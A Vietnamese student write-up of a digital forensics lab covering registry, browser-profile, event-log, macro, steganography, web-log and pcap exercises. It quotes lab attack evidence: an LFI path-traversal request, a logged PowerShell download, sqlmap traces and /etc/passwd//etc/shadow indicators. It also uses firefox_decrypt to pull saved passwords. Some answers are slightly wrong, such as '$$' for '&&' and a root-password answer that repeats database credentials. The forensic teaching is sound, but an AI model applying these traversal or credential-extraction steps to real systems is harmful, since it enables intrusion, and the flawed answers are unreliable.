## A. GitHub:
*Link tham khảo: [GitHub](https://github.com/vonderchild/digital-forensics-lab)*
### 1. Lab 01:
- If we wanted to list all the `.txt` files in the current directory, what command would we want to use?
> `ls *.txt`
- What command can we use to read the contents of the file `/etc/passwd`?
> `cat /etc/passwd`
- If we wanted to search for the string `Error` in all files in the `/var/log` directory, what would our command be?
> `grep -r "Error" /var/log`
- What would be the commands to calculate MD5 and SHA1 hashes of the file `/etc/passwd`?
> `md5sum /etc/passwd $$ sha1sum /etc/passwd`
- Use the `file` command to determine the type of the file `/usr/bin/cat` and explain the output in 2-3 sentences.
> ``` ubuntu
> kanrorikakemem@DESKTOP-ICMNRNE:~$ file /usr/bin/cat
> /usr/bin/cat: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=70bb40952afe7016b06511e5c96e926f1f4774ba, for GNU/Linux 3.2.0, stripped
> ```
> - `ELF 64-bit LSB pie executable`: Chương trình thực thi 64-bit theo định dạng ELF (Executable and Linkable Format), sử dụng kiểu LSB (Little Endian) và là PIE (Position Independent Executable).
> - `x86-64, version 1 (SYSV)`: Dành cho kiến trúc x86-64 theo chuẩn System V ABI.
> - File được liên kết động, sử dụng trình nạp động (`ld-linux`) để liên kết với các thư viện hệ thống khi chạy.
> - `BuildID[sha1]=...`: Mã định danh duy nhất của bản biên dịch.
> - `for GNU/Linux 3.2.0`: Được biên dịch để tương thích với kernel Linux ≥ 3.2.0.
> - `stripped`: Các biểu tượng gỡ lỗi (debug symbols) đã bị loại bỏ để giảm kích thước file.
- What command can we use to display all printable strings of length ≥ 8 in the file `/bin/bash`?
> `strings -n 8 /bin/bash`
- Given the following output of the `file` command, can you determine what’s wrong with this file?
```
$ file image.jpg
image.jpg: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3ab23bf566f9a955769e5096dd98093eca750431, for GNU/Linux 3.2.0, not stripped
```
> File `image.jpg` là file ELF 64-bit pie executable (file thực thi nhị phân của Linux), tức là không phải file `.jpg` như trong tên.
- If we wanted to look for files modified in the last 30 minutes in `/home` directory, what command would we want to use?
Hint: Explore how you can use `find` command to achieve this.
> `find /home -type f -mmin -30 -print`
- What command can we use to display information about all active TCP connections on the system?
> `netstat -antp`
- Given image file, can you find a way to recover and view its contents?
Hint 1: A quick google search for “magic bytes” might help.
Hint 2: Explore how `hexedit` can help you here.
You may download the image using following command:
```
curl https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%2001/files/challenge.png -o challenge.png
```
> - Đề yêu cầu ta phục hồi và đọc nội dung của nó. Có hai hint được đưa ra là kiểm tra magic bytes và dùng `hexedit`.
> - Magic bytes của `.png`: `89 50 4E 47 0D 0A 1A 0A`
> - Tiến hành kiểm tra các bytes đầu bằng lệnh:
> ```
> hexdump -C challenge.png | head -n 16
> ```
> ![image](https://hackmd.io/_uploads/SkKXtrFalx.png)
> Có thể thấy rằng byte đầu tiên đáng lẽ là `89` nếu ảnh `.png` là hợp lệ, nhưng vì nó là `17` nên bị dịch trái một byte so với header thật (file thật có `29` = `0x50 - 0x27`, tức là không khớp, hay nói cách khác là dữ liệu bị dời đi, ta chỉ cần bỏ byte đầu tiên `0x17` thì sẽ hợp lệ).
> - Bỏ byte đầu:
> ![image](https://hackmd.io/_uploads/S1NU5Htaxl.png)
> - Kiểm tra lại file:
> ![image](https://hackmd.io/_uploads/SJ4d9Btpxl.png)
> - Mở file ra xem:
> ![image](https://hackmd.io/_uploads/HyYjqHY6gl.png)

### 2. Lab 02:
- Given the registry file of a system that was compromised, answer the following:
    - What’s the mouse double-click speed?
    - What’s the most recent typed path accessed as recorded in the registry?
    - What’s the new value added to the registry by the malware in order to establish persistence over the system?
Download registry file ở [link](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2002/files/NTUSER.DAT).
> - Sau khi kết nối và đưa `NTUSER.DAT`, vào tool Registry Editor của Eric Zimmerman, bấm chọn `Load Hive` trong `File`.
> - Tìm đến `NTUSER.DAT` và `Open`, sau đó đặt `Key name` là `ForensicsUser`.
> ![image](https://hackmd.io/_uploads/B1S0o7Ragg.png)
> - Vào nhánh `HKEY_LOCAL_MACHINE\ForensicsUser\Control Panel\Mouse` và xem giá trị `DoubleClickSpeed`.
> ![image](https://hackmd.io/_uploads/Hyt4jtA6ge.png)
> **$\rightarrow$ Tốc double_click cần tìm là 500.**
> - 'the most recent typed path' là giá trị có index lớn nhất (urlN) trong registry key, ở đây ta thấy trong địa chỉ:
> ```
> HKEY_LOCAL_MACHINE\ForensicsUser\Software\Microsoft\Windows\CurrentVersion\Explorer\TypedPaths
> ```
> ![image](https://hackmd.io/_uploads/r17pzcCpex.png)
> **$\rightarrow$ Path cần tìm: `C:\Windows\System32\calc.exe`**
> - Malware thường thêm một giá trị vào Run/RunOnce keys để tự chạy lúc đăng nhập. Vào đường dẫn:
> ```
> HKEY_LOCAL_MACHINE\TempHive\Software\Microsoft\Windows\CurrentVersion\Run
> ```
> ![image](https://hackmd.io/_uploads/r1UcX5ATxg.png)
> **$\rightarrow$ Trong`Value Name` có `Malware` và `Data` của nó là `C:\Users\w\Desktop\malware.exe`.**
- Given the Firefox profile of a suspect, answer the following:
    - What’s the username and password stored in the saved logins?
    - What’s the most frequently visited website?
    - What’s the name of the file downloaded by the suspect?
Download Firefox profile ở [link](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2002/files/Firefox.zip).
> - Tải file `Firefox.zip` và unzip:
> ```
> cd ~
> wget https://github.com/vonderchild/digital-forensics-lab/raw/main/Lab%2002/files/Firefox.zip -O Firefox.zip
> unzip Firefox.zip -d firefox_profile
> ```
> - Kiểm tra thì ta có một thư mục:
> ![image](https://hackmd.io/_uploads/HkEG0W-Rgg.png)
> - Firefox mã hoá thông tin đăng nhập đã lưu bằng cách sử dụng master key trong file `key4.db` ở profile's directory. Để trích xuất usernames và passwords, ta có thể dùng tool `firefox_decrypt`:
> ![image](https://hackmd.io/_uploads/rk30CbZRxg.png)
> - Kiểm tra tiếp trong `Firefox`:
> ![image](https://hackmd.io/_uploads/SJhUMz-Cee.png)
> - Kiểm tra tiếp `Profiles`:
> ![image](https://hackmd.io/_uploads/BkW6MMZRxx.png)
> - Gán biến `PROFILE` chứa đường dẫn đến `s6upyldt.default-release`:
> - Ta có cú pháp cách dùng tool như sau:
> ```
> python3 firefox_decrypt.py <path>
> ```
> ![image](https://hackmd.io/_uploads/HJ-WBGbCex.png)
> - Áp dụng vào bài, khi đó:
> ![image](https://hackmd.io/_uploads/S1H7SzZ0xg.png)
> **$\rightarrow$ Vậy ta lấy được `Username` và `Password` đã lưu.**
> - Firefox lưu lịch sử duyệt web (URL, tiêu đề, số lần truy cập, thời gian,...) trong cơ sở dữ liệu SQLite có tên là `places.sqlite`. Ta xác định file này bằng `find`:
> ![image](https://hackmd.io/_uploads/r1VXUMbRlx.png)
> - Mở file bằng `sqlite3 <path>`, sau đó chạy truy vấn (`visit_count`: số lần truy cập trang; `ORDER BY visit_count DESC`; `LIMIT 10`: hiển thị 10 trang nhiều nhất):
> ![image](https://hackmd.io/_uploads/r1FRwzW0ex.png)
> - Nếu chạy bằng `sqlitebrowser places.sqlite`, truy vấn và `excute`:
> ![image](https://hackmd.io/_uploads/rya9wNZCxg.png)

> **$\rightarrow$ Từ output có thể thấy rằng `https://www.amazon.com/` là trang được truy cập nhiều nhất.**
> - Kiểm tra trong `/firefox_profile/Firefox/Profiles/s6upyldt.default-release/`:
> ![image](https://hackmd.io/_uploads/BJ8P47-Cgl.png)
> - `places.sqlite` là một tệp cơ sở dữ liệu SQLite sử dụng để lưu trữ lịch sử truy cập và bookmark của người dùng. Khi user download một tệp từ trình duyệt, Firefox sẽ ghi URL của tệp tải xuống vào bảng `moz_places`. 
> Mở `places.sqlite` bằng `sqlite3` và lọc theo đuôi `.exe`, `.zip`, `.pdf` hoặc URL có chứa `download`:
> ![image](https://hackmd.io/_uploads/BJj0bVZRxl.png)
> - Nếu chạy bằng `sqlitebrowser places.sqlite`, truy vấn và `excute`:
> ![image](https://hackmd.io/_uploads/H1GfPN-Agg.png)
> **$\rightarrow$ Từ output có thể thấy rằng `python-3.11.1-amd64.exe` là file được download xuống.**
- Given the PowerShell Event logs of a compromised system, answer the following:
    - What’s the command executed by the attacker to download a file on the system?
    - Can you analyze the downloaded file and understand what’s the purpose of that file?
The event logs file can be downloaded from [link https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab 02/files/Microsoft-Windows-PowerShell%254Operational.evtx
> - Đưa event logs file đã tải vào máy ảo và sử dụng tool Event Viewer tích hợp sẵn trong Windows. `Open Saved Log` và ta có:
> ![image](https://hackmd.io/_uploads/ryAkhmzAxx.png)
> - Dùng tính năng lọc Event ID `4104` (PowerShell Script Block Logging Event), nghĩa là nó được sinh ra mỗi khi Powershell thực thi command, ta có thể xem lại đoạn lệnh nào đã được chạy.
> - Sau khi lọc, dùng `Find...` tìm kiếm theo từ khoá `Invoke-WebRequest`:
>    - `Invoke-WebRequest` là cmdlet mặc định để thực thi HTTP(S) với cú pháp `Invoke-WebRequest -Uri <url> -OutFile <path>` hoặc `Invoke-WebRequest -Uri <url> | Select-Object -Expand Content` kết hợp với `IEX`.
>    - Nó thường được dùng để tải script hoặc binary từ Github.
>    - Khi ScriptBlockLogging bật, event `4104` thường lưu nguyên chuỗi đó.
>    - Ngoài ra có một số từ khoá khác để lọc mà ChatGPT gợi ý nhưng ta chỉ dùng được mỗi `Invoke-WebRequest`:
>    ![image](https://hackmd.io/_uploads/HyRuDwzRxe.png)
> - Sau khi lọc ta được ba kết quả. Chú ý có một event có nội dung `XML view` thế này:
> ``` XML
> - <Event > xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
>  - <System>
>     <Provider Name="Microsoft-Windows-PowerShell" Guid="{a0c1853b-5c40-4b15-8766-3cf1c58f985a}" /> 
>     <EventID>4104</EventID> 
>     <Version>1</Version> 
>     <Level>5</Level> 
>     <Task>2</Task> 
>     <Opcode>15</Opcode> 
>     <Keywords>0x0</Keywords> 
>     <TimeCreated SystemTime="2023-01-29T17:54:18.2648573Z" /> 
>     <EventRecordID>25</EventRecordID> 
>     <Correlation ActivityID="{fdf4d207-3468-0003-413b-f5fd6834d901}" /> 
>     <Execution ProcessID="8052" ThreadID="7960" /> 
>     <Channel>Microsoft-Windows-PowerShell/Operational</Channel> 
>     <Computer>DESKTOP-LS6AHAB</Computer> 
>     <Security UserID="S-1-5-21-373262212-2709455193-1596268631-1001" /> 
>   </System>
> - <EventData>
>     <Data Name="MessageNumber">1</Data> 
>     <Data Name="MessageTotal">1</Data> 
>     <Data Name="ScriptBlockText">Invoke-WebRequest -UseBasicParsing -Uri https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%202/files/file.ps1 -OutFile "file.ps1"</Data> 
>     <Data Name="ScriptBlockId">7dbea6ce-aa78-4acb-bfe5-3b1ab970ac22</Data> 
>     <Data Name="Path" /> 
>    </EventData>
>   </Event>
> ```
> **$\rightarrow$ Có thể thấy rằng lệnh mà attacker đã chạy là:**
> ```
> Invoke-WebRequest -UseBasicParsing -Uri https://raw.githubusercontent.com/vonderchild/digital-forensics-lab/main/Lab%202/files/file.ps1 -OutFile "file.ps1"
> ```
> Nghĩa là tải file từ [link](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2002/files/file.ps1) dưới tên `file.ps1`.
> - Nội dung `file.ps1`:
> ``` ubuntu
> $data = "SGVsbG8sIHVzZSBmbGFne2V2M250X2wwZ3NfZjByX3RoM193MW59IGFzIHRoZSBhbnN3ZXIgdG8gdGhlIG9yaWdpbmFsIHF1ZXN0aW9uLg=="
> $flag = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($data))
> Write-Output $flag
> ```
> Có thể thấy rằng `data` là một chuỗi Base64 và flag là ASCII chuyển từ `data`.
> - Chuyển sang ASCII:
> ![image](https://hackmd.io/_uploads/SJbmavfCll.png)
> Nếu chạy với Python:
> ``` py
> import base64
> b64 = "SGVsbG8sIHVzZSBmbGFne2V2M250X2wwZ3NfZjByX3RoM193MW59IGFzIHRoZSBhbnN3ZXIgdG8gdGhlIG9yaWdpbmFsIHF1ZXN0aW9uLg=="
> decoded = base64.b64decode(b64).decode('ascii')
> print(decoded)
> ```
> ![image](https://hackmd.io/_uploads/HkPV1_MRxg.png)
> **$\rightarrow$ Flag tìm được:** `flag{ev3nt_l0gs_f0r_th3_w1n}`

### 3. Lab 03:
#### a) Macro - Enabled Documents:
##### Đề bài:
- A phishing attack has been reported in your organization, where an employee received a malicious Word document in an email that appeared to come from a trusted source. The employee opened the document which had macros in it, resulting in the attacker gaining access to the employee’s computer. A secret which will reveal the attacker's identity, is embedded inside the macro code. You are tasked with analyzing the macro code and extracting the embedded secret.
- The secret has the format `flag{s0me_str1ng}`.
- Word document: [YealyBonus.docm](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2003/files/YearlyBonus.docm)

##### Phân tích cách làm:
- Dùng bộ tool `oletools` để phân tích macro từ file `YearlyBonus.docm`:
![image](https://hackmd.io/_uploads/By4kTVI7-g.png)
- Có thể thấy rằng VBA Macros được ước lượng rủi ro là `HIGH` và độc hại. Ta xem macro code nào được nhúng vào:
``` ubuntu
kanrorikakemem@DESKTOP-ICMNRNE:/mnt/c/Users/Ha Nguyen/Downloads$ olevba YearlyBonus.docm
olevba 0.60.2 on Python 3.10.12 - http://decalage.info/python/oletools
===============================================================================
FILE: YearlyBonus.docm
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas
in file: word/vbaProject.bin - OLE stream: 'VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -
Sub ConvertByteArrayToString(byteArray() As Byte)
    Dim str As String
    str = "Oh, and almost forgot, here's something little cryptic for you: " + StrConv(byteArray, vbUnicode)
    MsgBox str
End Sub


Sub doShenanigans()
    Dim byteArray(0 To 100) As Byte
    byteArray(0) = 77
    byteArray(1) = 101
    byteArray(2) = 109
    byteArray(3) = 34
    byteArray(4) = 22
    byteArray(5) = 111
    byteArray(6) = 101
    byteArray(7) = 107
    byteArray(8) = 22
    byteArray(9) = 104
    byteArray(10) = 91
    byteArray(11) = 87
    byteArray(12) = 98
    byteArray(13) = 98
    byteArray(14) = 111
    byteArray(15) = 22
    byteArray(16) = 97
    byteArray(17) = 100
    byteArray(18) = 101
    byteArray(19) = 109
    byteArray(20) = 22
    byteArray(21) = 111
    byteArray(22) = 101
    byteArray(23) = 107
    byteArray(24) = 104
    byteArray(25) = 22
    byteArray(26) = 109
    byteArray(27) = 87
    byteArray(28) = 111
    byteArray(29) = 22
    byteArray(30) = 87
    byteArray(31) = 104
    byteArray(32) = 101
    byteArray(33) = 107
    byteArray(34) = 100
    byteArray(35) = 90
    byteArray(36) = 22
    byteArray(37) = 87
    byteArray(38) = 22
    byteArray(39) = 76
    byteArray(40) = 56
    byteArray(41) = 55
    byteArray(42) = 22
    byteArray(43) = 99
    byteArray(44) = 87
    byteArray(45) = 89
    byteArray(46) = 104
    byteArray(47) = 101
    byteArray(48) = 22
    byteArray(49) = 89
    byteArray(50) = 94
    byteArray(51) = 87
    byteArray(52) = 98
    byteArray(53) = 98
    byteArray(54) = 91
    byteArray(55) = 100
    byteArray(56) = 93
    byteArray(57) = 91
    byteArray(58) = 36
    byteArray(59) = 0
    byteArray(60) = 0
    byteArray(61) = 79
    byteArray(62) = 101
    byteArray(63) = 107
    byteArray(64) = 104
    byteArray(65) = 22
    byteArray(66) = 92
    byteArray(67) = 98
    byteArray(68) = 87
    byteArray(69) = 93
    byteArray(70) = 22
    byteArray(71) = 95
    byteArray(72) = 105
    byteArray(73) = 48
    byteArray(74) = 22
    byteArray(75) = 92
    byteArray(76) = 98
    byteArray(77) = 87
    byteArray(78) = 93
    byteArray(79) = 113
    byteArray(80) = 105
    byteArray(81) = 107
    byteArray(82) = 89
    byteArray(83) = 94
    byteArray(84) = 85
    byteArray(85) = 99
    byteArray(86) = 42
    byteArray(87) = 89
    byteArray(88) = 104
    byteArray(89) = 38
    byteArray(90) = 85
    byteArray(91) = 99
    byteArray(92) = 107
    byteArray(93) = 89
    byteArray(94) = 94
    byteArray(95) = 85
    byteArray(96) = 109
    byteArray(97) = 38
    byteArray(98) = 109
    byteArray(99) = 23
    byteArray(100) = 115

    For iter = 0 To 100
        byteArray(iter) = byteArray(iter) + 3
    Next

    Call ConvertByteArrayToString(byteArray)
End Sub

Sub AutoOpen()

    Dim str As String
    str = "You have been hacked!"
    MsgBox str

    Call doShenanigans

End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
+----------+--------------------+---------------------------------------------+
```
- Chú ý đoạn code trong output, đây là VBA macro che giấu chuỗi bằng cách +3 mỗi byte rồi `StrConv(byteArray, vbUnicode)` để biến mảng byte thành chuỗi Unicode. Ta giải mã nó bằng cách -3 mỗi byte rồi chuyển nó về string nhưng không ra cái gì cả :DD
![image](https://hackmd.io/_uploads/ryGCNBUQWl.png)
- Search cách giải trên mạng thì tìm được gợi ý như sau:
![image](https://hackmd.io/_uploads/BJRxHBL7Ze.png)
- Vì họ nói rằng đoạn mã bị thay đổi nhẹ nhưng không phải +3 nên ta copy cả mảng số dán vào [ASCII Shift Cipher](https://www.dcode.fr/ascii-shift-cipher) rồi decrypt:
![image](https://hackmd.io/_uploads/H1FWIBIQWg.png)
- Output có được:
```
Wow, you really know your way around a VBA macro challenge.

Your flag is: flag{such_m4cr0_much_w0w!}
```
##### Kết quả:
`flag{such_m4cr0_much_w0w!}`

#### b) Presentation:
##### Đề bài:
- A mole within the government has leaked top secret information to a spy. The mole, aware of spycraft techniques, used steganography to hide the information within an image, which he then slipped to his handler. The spy received the image and pasted it into a PowerPoint document, covering it with multiple random images to conceal it. One of our spies has gained access to the enemy spy's computer and recovered the PowerPoint document. Your mission is to extract the first image, extract the top secret information as well as the name and location of his source inside the government.
- Powerpoint document: [Presentation.pptx](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2003/files/Presentation.pptx)

##### Phân tích cách làm:
- Ta được một file `.pptx`, OOXML format lưu trữ Office documents dưới dạng tệp ZIP nên file có được thực chất chỉ là ZIP files. Đổi đuôi thành `.zip` rồi giải nén nó. Sau đó vào phần `\Presentation\ppt\media\`:
![image](https://hackmd.io/_uploads/r1HL9H8QWl.png)
- Có 51 ảnh tất cả, trừ `image1.jpg` có dung lượng là 47KB thì toàn bộ còn lại đều là `.png` và có dung lượng nhỏ hơn nên khả năng cao `image1.jpg` chính là đối tượng cần tìm.
- Copy ảnh rồi đổi tên nó thành `stego.jpg` rồi kiểm tra metadata:
![image](https://hackmd.io/_uploads/HJr9TH8Qbl.png)
$\rightarrow$ Nội gián là `Michael Scott`, vị trí là `34.2109, -118.4364` hay `Los Angeles, California, USA`.
- Dùng tool `steghide` để trích các message khỏi ảnh thành file `.txt` (nhấn `Enter` khi bị hỏi pass) rồi đọc nội dung file `.txt` đó:
![image](https://hackmd.io/_uploads/H19j0rLmZe.png)

##### Kết quả:
- Nội gián: `Michael Scott`
- Vị trí: `34.2109, -118.4364` hay `Los Angeles, California, USA`
- Thông tin mật:
```
I have obtained information regarding a top secret mission. The details are highly classified and must not fall into the wrong hands. Proceed with caution and use extreme discretion in all communications regarding this matter.
```

#### c) super_secret_audio:
##### Đề bài:
- Provided with the audio file from the Audio Steganography section, figure out how you can view the spectogram and recover the flag using Audacity. Submit a screenshot.
- Audio file: [super_secret_audio.wav](https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab%2003/files/super_secret_audio.wav)

##### Phân tích cách làm:
- Tải [Audacity](https://www.audacityteam.org/) và import file âm thanh vào:
![image](https://hackmd.io/_uploads/r17YWY8QZl.png)
- Chuyển sang chế độ `Spectrogram`:
![image](https://hackmd.io/_uploads/B1GabY8QWx.png)
![image](https://hackmd.io/_uploads/Bkb1MFLmZg.png)

##### Kết quả:
`flag{h1dd3n_1n_th3_n01s3}`

### 4. Lab 04:
- The logs can be downloaded from https://github.com/vonderchild/digital-forensics-lab/tree/main/Lab%2004/files/logs.zip.
- You are a cyber security specialist who has been called upon to investigate a major cyber security breach. The company's web server has been compromised, and the attacker has attempted to exploit multiple vulnerabilities. You've been given the task of piecing together the attacker's intentions and uncovering the extent of the damage. With that in mind, your challenge is to answer the following questions:
> Trước khi làm ta cần phải set up môi trường:
> ![image](https://hackmd.io/_uploads/BypBACoV-x.png)
> ![image](https://hackmd.io/_uploads/rkaSy12E-g.png)

#### 1. What IP address does the attack seem to be originating from?
- Trong web server log, mỗi dòng thường bắt đầu bằng:
```
IP - - [time] "REQUEST" STATUS SIZE "REFERER" "USER-AGENT"
```
- Attacker thường gửi rất nhiều requests và requests sẽ độc hại hoặc bất thường nên ta sẽ đếm số request theo IP:
![image](https://hackmd.io/_uploads/rkV2myhVZe.png)
Với `awk '{print $1}'` để lấy IP, `uniq -c` để đếm và `sort -nr` để đẩy IP có số request nhiều nhất lên đầu. Kết quả là ta được output là IP `192.168.0.106` với số lần gửi request là `38`.
- Để kiểm tra IP trên có request độc hại không: `grep 192.168.1.106 access.log | less` (`grep` để lọc log và `less` để xem nội dung từng trang):
![image](https://hackmd.io/_uploads/HyIMWJnN-g.png)
Từ output trên, ta thấy rất nhiều `../` và `/etc/passwd` nên đây có thể là tấn công LFI.

**$\rightarrow$ Đáp án: `192.168.0.106`**

#### 2. Which vulnerabilities do you think are being exploited, and what evidence do you have to support your findings?
Từ câu 1, với các dấu hiệu như `../` và `/etc/passwd` nên đây có thể là tấn công LFI.
**$\rightarrow$ Đáp án: `Local File Inclusion (LFI)`**

#### 3. How can we determine what web browser the attacker is using?
- Ta cần xác định User-Agent. Các HTTP Header sẽ có dạng: `User-Agent: Mozilla/5.0 ...`
- Từ output ở câu 1, có thể thấy rằng ở cuối các request là `Firefox`.

**$\rightarrow$ Đáp án: `Firefox`**

#### 4. Did the attacker use any automated tools during the attack? If so, can you identify the name of the tool and its purpose?
- Ta có bảng sau:

| Tool     | User-Agent | Mục đích        |
| -------- | ---------- | --------------- |
| sqlmap   | `sqlmap`   | SQL Injection   |
| Nikto    | `Nikto`    | Scan web        |
| gobuster | `gobuster` | Directory brute |
| curl     | `curl/`    | Manual/Script |

- Từ ouput của câu 1, có thể thấy các dòng như:
```
192.168.0.106 - - [16/Feb/2023:01:36:55 +0500] "GET /users.php HTTP/1.1" 200 1117 "-" "sqlmap/1.6.11#stable (https://sqlmap.org)"
```
- Ngoài ra ta có thể dùng: `grep -i "sqlmap\|nikto\|curl\|python" access.log`:
![image](https://hackmd.io/_uploads/SkT2HynV-x.png)

**$\rightarrow$ Đáp án: `sqlmap` với mục đích là SQLi**

#### 5. Which file was the attacker trying to access but couldn't due to limited server access?
- Trong output có hai dòng:
```
192.168.0.106 - - [16/Feb/2023:01:36:02 +0500] "GET /d.php HTTP/1.1" 404 494 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
192.168.0.106 - - [16/Feb/2023:01:36:07 +0500] "GET /database.php HTTP/1.1" 404 494 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
```
- Ngoài ra có thể dùng cách:
![image](https://hackmd.io/_uploads/HyEEwJ24Ze.png)

**$\rightarrow$ Đáp án: `GET /d.php HTTP/1.1`, `GET /database.php HTTP/1.1`**

#### 6. Did the attacker gain access to any confidential data? If yes, how much data was compromised?
- Ta xem thử có request `200 OK` không, và từ output ở câu 1 ta thấy có rất nhiều nhưng lọc kĩ hơn:
![image](https://hackmd.io/_uploads/Bk_fjy2VZl.png)
Có thể thấy rằng lượng data là rất nhiều .-.
- Ngoài ra để xem thử xem có file nào nhạy cảm:
![image](https://hackmd.io/_uploads/HJ7Mu13Ebx.png)

#### 7. An important secret was compromised. Can you figure it out?
> Hint: The secret you're looking for is not in a `.sql` or a `.php` file.
- Trong output, ta thấy có dòng:
```
192.168.0.106 - - [16/Feb/2023:01:37:49 +0500] "GET /view.php?image=../../../../../../../../../important_note.txt HTTP/1.1" 200 501 "http://192.168.0.101:9090/images.php" "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0"
```
Có thể thấy rằng attacker không đọc được secret bằng `images.php` nên dùng LFI để chuyển sang `view.php` rồi dùng LFI và đã thành công.
**$\rightarrow$ Đáp án: `important_note.txt`, `501 bytes`**

#### 8. The attacker left a message for the server administrator. Find out what the message said, and also mention how you were able to find it.
- Message khả năng cao nằm trong `important_note.txt`. Thông thường `modsec_audit.log` sẽ có thể ghi request, response body và payload nên ta tìm dấu hiệu của file `important_note.txt` trong log này bằng `grep -i "important_note" modsec_audit.log` và output rất dài .-.
- Đọc thử từng trang trong log này bằng `less modsec_audit.log`, và sau khi lướt mỏi tay thì:
![image](https://hackmd.io/_uploads/BJ7Jfg24-g.png)

**$\rightarrow$ Đáp án:**
```
Hey there! Just a heads up - if we don't add security checks to our web app, our top-secret files might as well be written on a billboard. And trust me, we don't want that kind of attention. So let's get those checks in place, okay? We wouldn't want the world to know that our password is 'sup3r_s3cr3t_4nd_1mp0rt4nt_p4ssw0rd', now would we? ;)
```

#### 9. What were some indicators that confirmed that an attack had taken place? What were your key takeaways from this attack?
- Có rất nhiều dấu hiệu, như các dấu hiệu thấy được khi giải các câu trên hay cảnh báo trong `less modsec_audit.log`:
![Ảnh chụp màn hình 2026-01-07 213504](https://hackmd.io/_uploads/Bke6zlhEbx.png)
Và quan trọng nhất là ta đã thấy lời nhắn mà attackers để lại :DD
- Các bài học học được:
    - Lỗi xác thực dữ liệu đầu vào có thể dẫn đến các lỗ hổng nghiêm trọng như LFI.
    - Các tệp văn bản đơn giản cũng có thể chứa thông tin nhạy cảm và cần được bảo vệ.
    - Các tool như sqlmap làm tăng tốc độ và tác động của một cuộc tấn công.
    - Web server log là bằng chứng quan trọng để tái tạo hành vi của attacker và xác định sự xâm nhập.

#### 10. Based on this attack, what indicators of compromise can be used to detect future attacks?
- Địa chỉ IP của attacker.
- Các requests lặp đi lặp lại từ một địa chỉ IP trong một khoảng thời gian ngắn.
- Các pattern URL chứa chuỗi duyệt thư mục (`../`, `%2F`).
- Các requests cố gắng truy cập các tệp hệ thống như `/etc/passwd`, `/etc/shadow`,...
- Các requests nhắm vào các endpoint nhạy cảm như `view.php`, `users.php` và `command.php`.
- Chuỗi User-Agent liên kết với các công cụ tự động (`sqlmap/1.6.11`,...)
- Các lần truy cập thất bại và thành công lặp đi lặp lại vào các file không công khai.
- Requests POST bất thường với các commands quản trị hoặc backend.

### 5. Lab 05:
- The traffic capture file can be downloaded from: https://github.com/vonderchild/digital-forensics-lab/blob/main/Lab 05/files/challenge.pcapng
- The organization that previously hired you to investigate the web attack has reached out to you again. This time, they have managed to capture the network traffic during the attack. They have provided you with the captured traffic file to help piece together the attacker's intentions and the extent of the damage. Your job is to analyze the captured traffic and answer the following questions:
#### 1. What are the different protocols present in the captured traffic file?
Vào `Statistics` $\rightarrow$ `Protocol Hierarchy` để xem protocols nào đang được dùng trong lưu lượng và sự liên quan của các packets cho mỗi protocol:

![image](https://hackmd.io/_uploads/rkp7YV-BWx.png)
**$\rightarrow$ Đáp án: `TCP`, `HTTP`, `FTP Data`**

#### 2. It appears that the attacker is attempting to brute force the user's FTP password. Can you find any evidence of a correct password, and if so, what is it?
- Từ ảnh output ở câu trên, có thể thấy rằng số gói tin ở giao thức FTP nhiều bất thường và hơn các giao thức còn lại. Lọc các lưu lượng liên quan đến FTP:

![image](https://hackmd.io/_uploads/r1hq9N-SWg.png)
![image](https://hackmd.io/_uploads/rktIa4ZBWe.png)
Có thể thấy rằng một user vô danh có IP `192.168.0.110` cố gắng đi đến `192.168.0.106` bằng cách brute-force mật khẩu.
- Sau rất nhiều lần thử, attacker đã thành công với password `batman`:

![image](https://hackmd.io/_uploads/HJTpTNZBWe.png)
**$\rightarrow$ Đáp án: `batman`**

#### 3. What additional information was the attacker able to extract from the user's FTP account?
- Lướt tiếp thì ta phát hiện thêm hai file là `credentials.txt` và `.bash_history`:

![image](https://hackmd.io/_uploads/BkMZZB-rbg.png)

- Bấm vào một lưu lượng, chọn `File` $\rightarrow$ `Export Objects` $\rightarrow$ `FTP-DATA...` $\rightarrow$ `Save All` để extract hai file:

![image](https://hackmd.io/_uploads/rJOkxHbrWe.png)
- Nội dung `credentials.txt`:
```
Leaving my database username and password here in case I forget.

username: myuser
password: P@ssw0rd123456!
```
**$\rightarrow$ Đáp án: `credentials.txt`, `.bash_history`**

#### 4. What actions did the attacker take with the information obtained from the user's FTP account?
Từ output câu trên, ta thấy:
- `SIZE`: Check size của file.
- `EPSV`: Lệnh FTP yêu cầu server mở cổng passive mode để truyền data.
- `RETR`: Download file từ server về client.
- `MDMT`: Hỏi thời gian chỉnh sửa cuối của file.

**$\rightarrow$ Đáp án: Attacker tải file (`RETR`) và check file rất kỹ.** 

#### 5. What's the root account password?
Nội dung `credentials.txt`:
```
Leaving my database username and password here in case I forget.

username: myuser
password: P@ssw0rd123456!
```
